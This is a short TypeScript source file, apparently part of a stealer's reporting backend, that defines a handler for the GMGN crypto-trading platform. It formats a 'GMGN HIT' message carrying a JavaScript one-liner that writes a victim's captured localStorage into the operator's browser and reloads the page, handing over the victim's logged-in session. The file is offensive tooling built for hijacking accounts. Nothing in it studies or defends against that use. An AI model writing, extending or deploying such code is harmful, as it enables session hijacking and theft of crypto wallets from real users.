import type { PlatformHandler, ProcessResult, PlatformData } from './types.js';

// Обработчик для платформы GMGN (базовая реализация)
export class GmgnHandler implements PlatformHandler {
  name = 'gmgn';

  async processMessage(data: PlatformData): Promise<ProcessResult> {
    const walletData = data as any;
    console.log(`📊 Processing GMGN wallet data`);

    // Базовая реализация - просто форматируем данные
    let message = `🎮 <b>GMGN HIT</b>\n\n`;

    message += `<b>JS code for logging into a session:</b>\n`;
    message += `<code>((str)=>{try{const data=JSON.parse(str);for(const [key,value] of Object.entries(data)){let storeValue = value;if (typeof value === 'object' && value !== null) {storeValue = JSON.stringify(value);}localStorage.setItem(key, storeValue);}}catch{}window.location.reload();})('${walletData.localstorage}');</code>`;

    return {
      messageToSend: message,
      messageToSendFull: message,
    };
  }
}

